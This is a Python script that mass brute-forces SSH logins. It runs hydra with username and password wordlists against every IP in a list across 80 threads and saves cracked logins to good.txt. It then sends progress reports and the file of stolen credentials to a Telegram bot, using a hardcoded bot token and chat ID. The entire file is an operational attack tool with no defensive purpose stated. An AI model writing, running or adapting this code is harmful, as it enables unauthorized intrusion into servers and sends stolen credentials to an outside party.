import os
import subprocess
import requests
import time
from concurrent.futures import ThreadPoolExecutor, as_completed
from threading import Lock, Thread

BOT_TOKEN = '7059357956:AAG6VYmxtkoN4Swc0qlpgoJl7ph88YdzXhA'
CHAT_ID = '5326706151'
IP_FILE = 'ip.txt'
USERNAME_FILE = 'username.txt'
PASSWORD_FILE = 'password.txt'
STATUS_FILE = 'good.txt'

message_lock = Lock()
file_msg_id = None
status_msg_id = None
success_ips = set()
good_entries = []
tried_count = 0
total_ips = 0
last_ip_tried = ''

def send_request(method, url, **kwargs):
    while True:
        response = requests.request(method, url, **kwargs).json()
        if response.get("ok"):
            return response
        elif response.get("error_code") == 429:
            retry_after = response["parameters"]["retry_after"]
            print(f"[!] Rate limited. Sleeping {retry_after}s")
            time.sleep(retry_after)
        else:
            print(f"[!] Telegram error: {response}")
            return None

def get_last_status_message():
    url = f'https://api.telegram.org/bot{BOT_TOKEN}/getUpdates'
    resp = requests.get(url).json()
    if 'result' not in resp:
        return None, None
    messages = [
        msg for msg in resp['result']
        if 'message' in msg and str(msg['message']['chat']['id']) == CHAT_ID
        and 'text' in msg['message']
    ]
    messages.reverse()
    for msg in messages:
        text = msg['message'].get('text', '')
        if 'TRIED IPS:' in text and 'LAST :' in text:
            return msg['message']['message_id'], text
    return None, None

def parse_last_ip(text):
    for line in text.split('\n'):
        if line.startswith('LAST :'):
            return line.split('LAST :')[-1].strip()
    return None

def trim_ip_file(last_ip):
    with open(IP_FILE, 'r') as f:
        lines = [line.strip() for line in f if line.strip()]
    if last_ip in lines:
        index = lines.index(last_ip)
        remaining = lines[index + 1:]
    else:
        remaining = lines
    with open(IP_FILE, 'w') as f:
        f.write('\n'.join(remaining) + '\n')
    return remaining

def send_new_message(text):
    url = f'https://api.telegram.org/bot{BOT_TOKEN}/sendMessage'
    response = send_request("POST", url, data={'chat_id': CHAT_ID, 'text': text})
    if response:
        return response['result']['message_id']

def edit_status_message(text):
    global status_msg_id
    url = f'https://api.telegram.org/bot{BOT_TOKEN}/editMessageText'
    send_request("POST", url, data={'chat_id': CHAT_ID, 'message_id': status_msg_id, 'text': text})

def send_good_file():
    global file_msg_id
    url_send = f'https://api.telegram.org/bot{BOT_TOKEN}/sendDocument'
    url_delete = f'https://api.telegram.org/bot{BOT_TOKEN}/deleteMessage'
    if file_msg_id:
        send_request("POST", url_delete, data={'chat_id': CHAT_ID, 'message_id': file_msg_id})
    with open(STATUS_FILE, 'rb') as f:
        resp = send_request("POST", url_send, data={'chat_id': CHAT_ID}, files={'document': f})
        if resp:
            file_msg_id = resp['result']['message_id']

def periodic_update():
    while True:
        time.sleep(300)
        with message_lock:
            edit_status_message(f'''TRIED IPS: {tried_count}/{total_ips} Success : {len(success_ips)} fail : {tried_count - len(success_ips)} LAST : {last_ip_tried}''')
            if os.path.exists(STATUS_FILE):
                send_good_file()

def brute_force(ip):
    global tried_count, last_ip_tried
    cmd = ['hydra', '-t', '60', '-L', USERNAME_FILE, '-P', PASSWORD_FILE, f'ssh://{ip}']
    result = subprocess.run(cmd, stdout=subprocess.PIPE, stderr=subprocess.DEVNULL)
    output = result.stdout.decode()
    success_lines = [line for line in output.splitlines() if 'login:' in line]
    with message_lock:
        tried_count += 1
        last_ip_tried = ip
        if success_lines and ip not in success_ips:
            success_ips.add(ip)
            good_entries.extend(success_lines)
            with open(STATUS_FILE, 'a') as f:
                for line in success_lines:
                    f.write(line + '\n')

def main():
    global status_msg_id, total_ips
    message_id, status_text = get_last_status_message()
    if message_id and status_text:
        last_ip = parse_last_ip(status_text)
        ips = trim_ip_file(last_ip)
    else:
        ips = open(IP_FILE).read().splitlines()
    status_msg_id = send_new_message('[+] Bruting started...')
    total_ips = len(ips)
    Thread(target=periodic_update, daemon=True).start()
    with ThreadPoolExecutor(max_workers=80) as executor:
        futures = [executor.submit(brute_force, ip) for ip in ips]
        for _ in as_completed(futures):
            pass

if __name__ == '__main__':
    main()
